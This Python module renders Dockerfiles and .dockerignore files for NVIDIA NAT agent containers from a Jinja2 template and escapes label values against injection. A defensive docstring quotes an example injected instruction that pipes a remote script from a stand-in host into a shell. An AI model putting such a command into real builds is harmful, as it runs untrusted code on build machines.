# SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Jinja2-based Dockerfile renderer for NAT agents.

Renders a Dockerfile from a built-in template using values resolved from
CLI flags, environment variables, or sensible defaults.

Two rendering modes are supported:

* **Config-only mode** – the agent is defined by a single ``config.yaml``.
  The Dockerfile installs ``nvidia-nat[most]`` from PyPI.
* **Project mode** – the agent ships as a full Python project with a
  ``pyproject.toml``.  The Dockerfile runs ``uv pip install .`` and trusts
  the user's ``pyproject.toml`` as the single source of truth for
  dependencies, Python version, and project metadata.  ``uv sync`` is not
  used because it honors ``[tool.uv.sources]`` path overrides that
  typically point at sibling workspace packages outside the build context.
  The template intentionally does NOT paper over common pyproject bugs
  (commented-out ``nvidia-nat``, monorepo-relative ``[tool.setuptools_scm]``
  roots, path-based ``[tool.uv.sources]``) — fixing those in the pyproject
  is the user's responsibility and keeps the container build reproducible.
"""

from __future__ import annotations

import os
from dataclasses import dataclass, field, fields
from pathlib import Path

import jinja2

# Marker written as the first line of every plugin-generated ``.dockerignore``
# / ``Dockerfile``.  ``render_dockerignore`` and the CLI no-build path only
# overwrite a file whose first line matches the sentinel — a user-tuned file
# next to a project's pyproject is preserved instead of silently destroyed by
# the next ``nemo agents package`` invocation.
DOCKERIGNORE_SENTINEL = "# Managed by `nemo agents package` — safe to delete if you take ownership."
DOCKERFILE_SENTINEL = "# Managed by `nemo agents package` — safe to delete if you take ownership."


def is_plugin_managed(path: Path) -> bool:
    """Return True if *path* exists and its first line matches the sentinel.

    Used by the CLI no-build path to distinguish a Dockerfile / .dockerignore
    that the plugin itself wrote on a previous run (safe to overwrite) from
    one the user wrote by hand (must not be clobbered).
    """
    if not path.exists():
        return False
    try:
        first_line = path.read_text(encoding="utf-8", errors="replace").splitlines()[:1]
    except OSError:
        return False
    if not first_line:
        return False
    return first_line[0] in (DOCKERFILE_SENTINEL, DOCKERIGNORE_SENTINEL)


# -- Defaults ---------------------------------------------------------------

_DEFAULTS: dict[str, str] = {
    "base_image_url": "nvcr.io/nvidia/base/ubuntu",
    "base_image_tag": "noble-20260217",
    "python_version": "3.13",
    "uv_version": "0.8.15",
    # Default NAT version — used ONLY as a last-resort fallback.  Callers are
    # expected to pass ``--nat-version`` (or set ``NAT_VERSION``) explicitly
    # so that image tags, labels, and the ``nvidia-nat[most]`` constraint
    # are reproducible.  The ``[most]`` extra pins ``nvidia-nat-core`` and
    # every plugin (langchain, mcp, eval, weave, phoenix, ...) to the SAME
    # version, so a single ``==${NAT_VERSION}`` constraint keeps the
    # core/plugin ABI consistent and avoids ``ImportError: cannot import
    # name ...`` at runtime.  When bumping this default, verify the version
    # resolves cleanly with ``uv pip install --prerelease=allow
    # 'nvidia-nat[most]==<ver>'`` against public PyPI.  Note: NAT does not
    # define an ``[all]`` extra — ``[most]`` is the comprehensive one
    # (includes langchain / react-agent / wiki-search).
    "nat_version": "1.7.0",
}

_ENV_MAP: dict[str, str] = {
    "base_image_url": "NAT_BASE_IMAGE_URL",
    "base_image_tag": "NAT_BASE_IMAGE_TAG",
    "python_version": "NAT_PYTHON_VERSION",
    "nat_version": "NAT_VERSION",
    "uv_version": "NAT_UV_VERSION",
}

# -- Jinja2 template --------------------------------------------------------

DOCKERFILE_TEMPLATE = (
    f"""\
{DOCKERFILE_SENTINEL}
"""
    + """\
ARG BASE_IMAGE_URL={{ base_image_url }}
ARG BASE_IMAGE_TAG={{ base_image_tag }}
ARG PYTHON_VERSION={{ python_version }}
ARG NAT_VERSION={{ nat_version }}
FROM ${BASE_IMAGE_URL}:${BASE_IMAGE_TAG}
ARG PYTHON_VERSION
ARG NAT_VERSION

COPY --from=ghcr.io/astral-sh/uv:{{ uv_version }} /uv /uvx /bin/

ENV PYTHONDONTWRITEBYTECODE=1

# Keep the uv-managed Python in a world-readable location and use copy
# link-mode so the venv is self-contained (no cross-directory symlinks),
# letting the non-root runtime user exec it without needing /root access.
ENV UV_PYTHON_INSTALL_DIR=/opt/uv/python \\
    UV_LINK_MODE=copy

RUN apt-get update && \\
    apt-get install -y --no-install-recommends g++ gcc ca-certificates curl && \\
    update-ca-certificates && \\
    rm -rf /var/lib/apt/lists/*

ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt

WORKDIR /workspace

COPY ./ /workspace
{% if has_pyproject %}
# Project mode.  ``pyproject.toml`` is the single source of truth: it must
# declare ``nvidia-nat[...]`` (for the ``nat`` CLI), a concrete ``version``
# (or a container-resolvable dynamic version), and every runtime dep.
# ``uv sync`` is deliberately not used because it honors
# ``[tool.uv.sources]`` path overrides pointing at sibling workspace
# packages that typically do not exist inside the build context.
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    uv pip install . && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% else %}
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    test -n "${NAT_VERSION}" || { echo "NAT_VERSION build-arg is required" >&2; exit 1; } && \\
    uv pip install --prerelease=allow "nvidia-nat[most]==${NAT_VERSION}" && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% endif %}
LABEL org.opencontainers.image.title="{{ agent_name | dockerfile_escape }}" \\
      org.opencontainers.image.version="{{ agent_version | dockerfile_escape }}" \\
      org.opencontainers.image.authors="{{ agent_author | dockerfile_escape }}" \\
      org.opencontainers.image.created="{{ build_timestamp | dockerfile_escape }}" \\
      org.opencontainers.image.description="{{ description | dockerfile_escape }}" \\
      org.opencontainers.image.revision="{{ revision | dockerfile_escape }}" \\
      org.opencontainers.image.source="{{ source | dockerfile_escape }}" \\
{%- if licenses %}
      org.opencontainers.image.licenses="{{ licenses | dockerfile_escape }}" \\
{%- endif %}
      com.nemo.agent.id="{{ agent_id | dockerfile_escape }}" \\
      com.nemo.agent.framework="{{ agent_framework | dockerfile_escape }}" \\
      com.nemo.agent.nat-version="{{ nat_version | dockerfile_escape }}" \\
      com.nemo.agent.contract-version="{{ contract_version | dockerfile_escape }}"

ENV NAT_CONFIG_FILE={{ config_file_path }}

ENV PATH="/workspace/.venv/bin:$PATH"
{% if not allow_root %}
# Some modern base images (notably Ubuntu 24.04 "noble" and the NVIDIA base
# images derived from it) ship with a default unprivileged user at
# uid=1000/gid=1000.  Reclaim 1000 for ``agent`` *by id, not by name* so this
# layer is portable across older base images (where 1000 is free; the guarded
# delete is a no-op) and across future base images that might rename the
# default user.
RUN if getent passwd 1000 >/dev/null; then userdel -rf "$(getent passwd 1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    if getent group  1000 >/dev/null; then groupdel -f "$(getent group  1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    groupadd -g 1000 agent && useradd -u 1000 -g agent -m agent && \\
    chown -R agent:agent /workspace
USER agent
{% endif %}
ENTRYPOINT ["sh", "-c", "exec nat serve --config_file=$NAT_CONFIG_FILE --host 0.0.0.0"]
"""
)

DOCKERIGNORE_TEMPLATE = f"""\
{DOCKERIGNORE_SENTINEL}
.env
.env.*
*.pem
*.key
credentials.json
.git/
.gitignore
__pycache__/
*.pyc
.pytest_cache/
.mypy_cache/
.ruff_cache/
*.egg-info/
dist/
build/
.venv/
node_modules/
"""


# -- Data class for render parameters --------------------------------------


@dataclass
class RenderParams:
    """Resolved parameters for Dockerfile rendering."""

    base_image_url: str = ""
    base_image_tag: str = ""
    python_version: str = ""
    nat_version: str = ""
    uv_version: str = ""
    has_pyproject: bool = False
    config_file_path: str = "/workspace/config.yaml"
    allow_root: bool = False
    agent_id: str = ""
    agent_name: str = ""
    agent_version: str = ""
    agent_author: str = ""
    agent_framework: str = ""
    build_timestamp: str = ""
    contract_version: str = ""
    description: str = ""
    licenses: str = ""
    revision: str = ""
    source: str = ""
    extra: dict[str, str] = field(default_factory=dict)


# -- Public API -------------------------------------------------------------


def resolve_value(name: str, explicit: str | None = None) -> str:
    """Return the first non-empty value from *explicit*, env var, or default.

    Raises ``ValueError`` for required parameters (those without a default)
    when no value can be resolved.
    """
    value, _ = resolve_value_with_source(name, explicit)
    return value


def resolve_value_with_source(name: str, explicit: str | None = None) -> tuple[str, str]:
    """Same as :func:`resolve_value` but also returns where the value came from.

    Returns:
        A tuple ``(value, source)`` where *source* is one of
        ``"explicit"``, ``"env"``, or ``"default"``.
    """
    if explicit:
        return explicit, "explicit"
    env_var = _ENV_MAP.get(name)
    if env_var:
        env_val = os.environ.get(env_var, "")
        if env_val:
            return env_val, "env"
    default = _DEFAULTS.get(name)
    if default:
        return default, "default"
    raise ValueError(
        f"'{name}' is required.  Pass it explicitly, or set the "
        f"{_ENV_MAP.get(name, name.upper())} environment variable."
    )


def _dockerfile_escape(value: object) -> str:
    """Sanitize a value for safe inclusion inside a Dockerfile double-quoted string.

    Defends against label-injection from any external source whose contents
    flow into ``LABEL ... = "{{ ... }}"`` lines — ``git config user.name``,
    ``git remote get-url origin``, ``pyproject [project].description``, and
    user-supplied ``--agent-author`` / ``--agent-version`` strings. Without
    this filter, a value containing ``"`` or a newline can terminate the
    label string early and inject arbitrary Dockerfile instructions
    (``RUN curl evil.sh | sh``) into the rendered output.

    Backslashes are escaped first so we don't double-escape our own escapes.
    Newlines and carriage returns are collapsed to a single space.
    """
    text = value if isinstance(value, str) else str(value)
    text = text.replace("\\", "\\\\").replace('"', '\\"')
    text = text.replace("\r", " ").replace("\n", " ")
    return text


def _jinja_env() -> jinja2.Environment:
    """Build the shared Jinja2 environment used to render Dockerfiles.

    ``autoescape=False`` because the output is a Dockerfile (not HTML); the
    ``dockerfile_escape`` filter is invoked explicitly at every label
    interpolation site. ``StrictUndefined`` so a typo in an external
    template fails at render time instead of producing a Dockerfile with
    silently empty ``ARG`` / ``LABEL`` lines.
    """
    env = jinja2.Environment(
        autoescape=False,
        keep_trailing_newline=True,
        undefined=jinja2.StrictUndefined,
    )
    env.filters["dockerfile_escape"] = _dockerfile_escape
    return env


def render_dockerfile(
    agent_config: Path,
    pyproject: Path | None = None,
    *,
    base_image_url: str | None = None,
    base_image_tag: str | None = None,
    python_version: str | None = None,
    nat_version: str | None = None,
    uv_version: str | None = None,
    allow_root: bool = False,
    agent_version: str | None = None,
    agent_author: str | None = None,
    template_path: str | None = None,
    metadata: dict[str, str] | None = None,
) -> str:
    """Render a Dockerfile string for a NAT agent.

    Args:
        agent_config: Path to the agent ``config.yaml``.
        pyproject: Optional path to ``pyproject.toml`` (enables project mode).
        base_image_url: Override base image URL.
        base_image_tag: Override base image tag.
        python_version: Override Python version.
        nat_version: NAT version (required).
        uv_version: Override ``uv`` version.
        allow_root: When True, skip non-root USER creation.
        agent_version: Override agent version label.
        agent_author: Override agent author label.
        template_path: Path to an external Jinja2 template file.
        metadata: Pre-computed metadata from
            :func:`~nemo_agents_plugin.container.metadata.extract_agent_metadata`.
            When supplied, avoids a duplicate extraction (which would shell
            out to ``git`` three times and re-parse the yaml/toml).

    Returns:
        The rendered Dockerfile as a string.

    Raises:
        ValueError: If a required parameter cannot be resolved, or the
            agent config lies outside the pyproject build context (which
            would otherwise produce an image that crashes at startup
            looking for the missing config file).
    """
    from nemo_agents_plugin.container.metadata import extract_agent_metadata

    has_pyproject = pyproject is not None and pyproject.exists()

    if has_pyproject:
        assert pyproject is not None
        try:
            relative_config = agent_config.resolve().relative_to(pyproject.resolve().parent)
        except ValueError as exc:
            # Falling back to ``Path(agent_config.name)`` here is unsafe —
            # the rendered image would set ``NAT_CONFIG_FILE=/workspace/<name>``
            # while the COPY of the project tree never picks up the
            # out-of-tree config. The container would build successfully and
            # then crash at ``nat serve`` startup with file-not-found.
            raise ValueError(
                f"agent config {agent_config} is outside the pyproject build "
                f"context ({pyproject.resolve().parent}); move it into the "
                "project tree or omit --pyproject to use the config's directory "
                "as the build context."
            ) from exc
        config_file_path = f"/workspace/{relative_config.as_posix()}"
    else:
        config_file_path = f"/workspace/{agent_config.name}"

    resolved_nat = resolve_value("nat_version", nat_version)
    contract_version = _get_contract_version()

    if metadata is None:
        metadata = extract_agent_metadata(
            agent_config,
            pyproject,
            agent_version=agent_version,
            agent_author=agent_author,
        )

    params = RenderParams(
        base_image_url=resolve_value("base_image_url", base_image_url),
        base_image_tag=resolve_value("base_image_tag", base_image_tag),
        python_version=resolve_value("python_version", python_version),
        nat_version=resolved_nat,
        uv_version=resolve_value("uv_version", uv_version),
        has_pyproject=has_pyproject,
        config_file_path=config_file_path,
        allow_root=allow_root,
        contract_version=contract_version,
        agent_id=metadata["agent_id"],
        agent_name=metadata["agent_name"],
        agent_version=metadata["agent_version"],
        agent_author=metadata["agent_author"],
        agent_framework=metadata["agent_framework"],
        build_timestamp=metadata["build_timestamp"],
        description=metadata["description"],
        licenses=metadata["licenses"],
        revision=metadata["revision"],
        source=metadata["source"],
    )

    if template_path:
        # Convert filesystem failures into the documented ``ValueError``
        # contract.  ``_validate_package_flags`` already rejects a missing
        # ``--template`` upfront, but the file can race (chmod, deletion,
        # encoding errors) between that check and the read here.  Letting
        # the raw ``OSError`` / ``UnicodeDecodeError`` propagate would
        # surface as an uncaught traceback because the CLI's error
        # handler only catches ``ValueError``.
        try:
            template_source = Path(template_path).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            raise ValueError(f"failed to read --template file {template_path}: {exc}") from exc
    else:
        template_source = DOCKERFILE_TEMPLATE

    template = _jinja_env().from_string(template_source)
    ctx = {f.name: getattr(params, f.name) for f in fields(params) if f.name != "extra"}
    ctx.update(params.extra)
    return template.render(**ctx)


def _get_contract_version() -> str:
    """Return the ``nemo-agents-plugin`` package version."""
    from importlib.metadata import PackageNotFoundError, version

    try:
        return version("nemo-agents-plugin")
    except PackageNotFoundError:
        return "0.0.0"


def render_dockerignore(output_dir: Path) -> Path | None:
    """Write the plugin's ``.dockerignore`` into *output_dir*.

    The file is only written when *output_dir* contains no ``.dockerignore``
    or contains one whose first line matches :data:`DOCKERIGNORE_SENTINEL`
    (i.e. was itself generated by this plugin on a previous invocation).
    A user-tuned ``.dockerignore`` is left untouched, and ``None`` is
    returned so the builder's ``finally`` cleanup leaves it in place too.

    Returns the path written, or ``None`` when a user-owned file was preserved.
    """
    path = output_dir / ".dockerignore"
    if path.exists():
        try:
            first_line = path.read_text(encoding="utf-8", errors="replace").splitlines()[:1]
        except OSError:
            first_line = []
        if not first_line or first_line[0] != DOCKERIGNORE_SENTINEL:
            return None
    path.write_text(DOCKERIGNORE_TEMPLATE, encoding="utf-8")
    return path
